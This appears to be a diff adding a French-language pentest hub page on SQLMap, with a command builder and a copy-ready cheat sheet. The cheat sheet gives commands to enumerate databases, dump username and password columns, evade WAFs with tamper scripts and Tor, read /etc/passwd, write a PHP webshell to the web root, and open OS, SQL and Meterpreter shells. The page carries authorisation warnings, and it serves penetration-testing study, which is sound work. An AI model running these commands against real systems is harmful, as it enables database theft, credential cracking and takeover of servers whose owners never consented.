@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQLMap — PenTest Hub</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="navbar-brand"><a href="../index.html" style="color:inherit;"><span class="bracket">[</span>PenTest Hub<span class="bracket">]</span></a></div>
+  <div class="navbar-nav">
+    <a href="../index.html">Dashboard</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="wireshark.html">Wireshark</a>
+    <a href="sqlmap.html" class="active">SQLMap</a>
+    <a href="john.html">John</a>
+    <a href="google-dorks.html">Dorks</a>
+    <a href="osint.html">OSINT</a>
+    <a href="netcat.html">Netcat</a>
+  </div>
+</nav>
+
+<div class="tool-page">
+  <a href="../index.html" class="back-btn">← Retour au Hub</a>
+
+  <div class="tool-page-header">
+    <div class="tool-page-icon">💉</div>
+    <div>
+      <div class="tool-page-title">SQLMap</div>
+      <div class="tool-page-subtitle">Détection et exploitation automatique des injections SQL</div>
+      <div class="tool-page-meta">
+        <span class="badge badge-yellow">Web</span>
+        <span class="badge badge-red">SQLi</span>
+        <span class="badge badge-blue">Automatisé</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="info-box warning">
+    <span class="info-box-icon">⚠️</span>
+    <div class="info-box-text">Utilisez SQLMap uniquement sur des applications web dont vous êtes propriétaire ou pour lesquelles vous avez une autorisation écrite explicite.</div>
+  </div>
+
+  <h2 class="section-h">📦 Installation</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Installation</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Kali Linux (préinstallé)</span>
+sqlmap --version
+
+<span class="cmd-comment"># Depuis GitHub</span>
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap && python3 sqlmap.py --version
+
+<span class="cmd-comment"># pip</span>
+pip3 install sqlmap</code></pre>
+  </div>
+
+  <!-- COMMAND BUILDER -->
+  <h2 class="section-h">⚙️ Générateur de commande</h2>
+  <div class="builder-form" id="sqlmapBuilder">
+    <div class="builder-grid">
+      <div class="form-group">
+        <label>URL cible</label>
+        <input type="text" id="sqlmap-url" class="form-control" placeholder="http://target.com/page?id=1" value="http://target.com/page?id=1">
+      </div>
+      <div class="form-group">
+        <label>Level (1-5)</label>
+        <select id="sqlmap-level" class="form-control">
+          <option value="1">1 — Défaut</option>
+          <option value="2">2 — Cookies</option>
+          <option value="3">3 — User-Agent, Referer</option>
+          <option value="4">4 — Plus de payloads</option>
+          <option value="5">5 — Maximum</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>Risk (1-3)</label>
+        <select id="sqlmap-risk" class="form-control">
+          <option value="1">1 — Défaut (sûr)</option>
+          <option value="2">2 — Heavy queries</option>
+          <option value="3">3 — OR-based (dangereux)</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>DBMS cible</label>
+        <select id="sqlmap-dbms" class="form-control">
+          <option value="">Auto-détection</option>
+          <option value="MySQL">MySQL</option>
+          <option value="PostgreSQL">PostgreSQL</option>
+          <option value="Microsoft SQL Server">MSSQL</option>
+          <option value="Oracle">Oracle</option>
+          <option value="SQLite">SQLite</option>
+        </select>
+      </div>
+    </div>
+    <div class="form-group" style="margin-bottom:20px;">
+      <label>Options</label>
+      <div class="checkbox-group">
+        <label class="checkbox-item"><input type="checkbox" value="--dbs"> --dbs (lister BDD)</label>
+        <label class="checkbox-item"><input type="checkbox" value="--tables"> --tables</label>
+        <label class="checkbox-item"><input type="checkbox" value="--dump"> --dump (extraire)</label>
+        <label class="checkbox-item"><input type="checkbox" value="--batch"> --batch (non-interactif)</label>
+        <label class="checkbox-item"><input type="checkbox" value="--random-agent"> --random-agent</label>
+        <label class="checkbox-item"><input type="checkbox" value="--tor"> --tor (anonymat)</label>
+        <label class="checkbox-item"><input type="checkbox" value="--forms"> --forms (auto-detect)</label>
+        <label class="checkbox-item"><input type="checkbox" value="--crawl=2"> --crawl=2</label>
+        <label class="checkbox-item"><input type="checkbox" value="--os-shell"> --os-shell</label>
+        <label class="checkbox-item"><input type="checkbox" value="--sql-shell"> --sql-shell</label>
+      </div>
+    </div>
+    <div class="builder-output">
+      <span id="sqlmap-output">sqlmap -u "http://target.com/page?id=1"</span>
+      <button class="builder-copy-btn" id="sqlmap-copy">⎘ Copier</button>
+    </div>
+  </div>
+
+  <h2 class="section-h">📋 Cheatsheet complet</h2>
+
+  <h3 class="sub-h">Découverte et énumération</h3>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Reconnaissance SQLi</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Test de base sur paramètre GET</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span>
+
+<span class="cmd-comment"># Mode non-interactif (recommandé en automatisation)</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--batch</span>
+
+<span class="cmd-comment"># Lister toutes les bases de données</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--dbs</span>
+
+<span class="cmd-comment"># Lister les tables d'une base</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">-D</span> <span class="cmd-value">mydb</span> <span class="cmd-flag">--tables</span>
+
+<span class="cmd-comment"># Lister les colonnes d'une table</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">-D</span> <span class="cmd-value">mydb</span> <span class="cmd-flag">-T</span> <span class="cmd-value">users</span> <span class="cmd-flag">--columns</span>
+
+<span class="cmd-comment"># Dumper une table entière</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">-D</span> <span class="cmd-value">mydb</span> <span class="cmd-flag">-T</span> <span class="cmd-value">users</span> <span class="cmd-flag">--dump</span>
+
+<span class="cmd-comment"># Dumper colonnes spécifiques</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">-D</span> <span class="cmd-value">mydb</span> <span class="cmd-flag">-T</span> <span class="cmd-value">users</span> <span class="cmd-flag">-C</span> <span class="cmd-value">username,password</span> <span class="cmd-flag">--dump</span>
+
+<span class="cmd-comment"># Utilisateur de la BDD et droits</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--current-user --current-db --is-dba</span></code></pre>
+  </div>
+
+  <h3 class="sub-h">Requêtes POST et authentification</h3>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">POST / Sessions</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Paramètre POST</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/login"</span> <span class="cmd-flag">--data</span> <span class="cmd-string">"username=test&password=test"</span>
+
+<span class="cmd-comment"># Avec cookie de session</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--cookie</span> <span class="cmd-string">"PHPSESSID=abc123; auth=1"</span>
+
+<span class="cmd-comment"># Depuis un fichier requête HTTP (Burp Suite export)</span>
+sqlmap <span class="cmd-flag">-r</span> <span class="cmd-value">request.txt</span>
+
+<span class="cmd-comment"># Avec header HTTP custom</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">-H</span> <span class="cmd-string">"Authorization: Bearer TOKEN"</span>
+
+<span class="cmd-comment"># Injection dans un header</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/"</span> <span class="cmd-flag">-p</span> <span class="cmd-value">User-Agent</span> <span class="cmd-flag">--level 3</span>
+
+<span class="cmd-comment"># Crawler automatique du site</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/"</span> <span class="cmd-flag">--crawl=3 --forms --batch</span></code></pre>
+  </div>
+
+  <h3 class="sub-h">Bypass WAF et évasion</h3>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">WAF Bypass</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># User-Agent aléatoire</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--random-agent</span>
+
+<span class="cmd-comment"># Tamper scripts pour bypass WAF</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--tamper=space2comment</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--tamper=between,randomcase,space2comment</span>
+
+<span class="cmd-comment"># Tampers courants</span>
+<span class="cmd-comment"># space2comment    — remplace espaces par /**/ </span>
+<span class="cmd-comment"># between          — ajoute BETWEEN au lieu de = </span>
+<span class="cmd-comment"># randomcase       — casse aléatoire (SeLeCt)</span>
+<span class="cmd-comment"># base64encode     — encode les payloads en base64</span>
+<span class="cmd-comment"># charencode       — encode URL les caractères</span>
+<span class="cmd-comment"># hex2char         — convertit les strings en hex</span>
+
+<span class="cmd-comment"># Délai entre requêtes</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--delay=2</span>
+
+<span class="cmd-comment"># Via Tor</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--tor --tor-type=SOCKS5 --check-tor</span>
+
+<span class="cmd-comment"># Proxy Burp Suite</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--proxy=http://127.0.0.1:8080</span></code></pre>
+  </div>
+
+  <h3 class="sub-h">Exploitation avancée</h3>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Post-exploitation SQLi</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Shell SQL interactif</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--sql-shell</span>
+
+<span class="cmd-comment"># Shell OS (si privileges suffisants)</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--os-shell</span>
+
+<span class="cmd-comment"># Lire un fichier sur le serveur</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--file-read=/etc/passwd</span>
+
+<span class="cmd-comment"># Écrire un fichier (webshell)</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--file-write=shell.php --file-dest=/var/www/html/shell.php</span>
+
+<span class="cmd-comment"># Cracker les hashes automatiquement</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">-D mydb -T users --dump</span> <span class="cmd-flag">--passwords</span>
+
+<span class="cmd-comment"># Obtenir un Meterpreter (Metasploit)</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--os-pwn --msf-path=/usr/share/metasploit-framework</span></code></pre>
+  </div>
+
+  <h3 class="sub-h">Techniques d'injection</h3>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Techniques SQLMap (-technique)</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Forcer une technique spécifique</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--technique=B</span>
+
+<span class="cmd-comment">Techniques disponibles :</span>
+<span class="cmd-success">B</span>  — Boolean-based blind
+<span class="cmd-success">E</span>  — Error-based
+<span class="cmd-success">U</span>  — UNION query-based
+<span class="cmd-success">S</span>  — Stacked queries
+<span class="cmd-success">T</span>  — Time-based blind
+<span class="cmd-success">Q</span>  — Inline queries
+
+<span class="cmd-comment"># Combinaison (défaut = BEUSTQ)</span>
+sqlmap <span class="cmd-flag">-u</span> <span class="cmd-string">"http://target.com/page?id=1"</span> <span class="cmd-flag">--technique=BET</span></code></pre>
+  </div>
+
+</div>
+
+<footer class="footer"><span>[PenTest Hub]</span> — Usage légal uniquement | © Steveny</footer>
+<div id="toast" class="toast"></div>
+<script src="../js/main.js"></script>
+</body>
+</html>
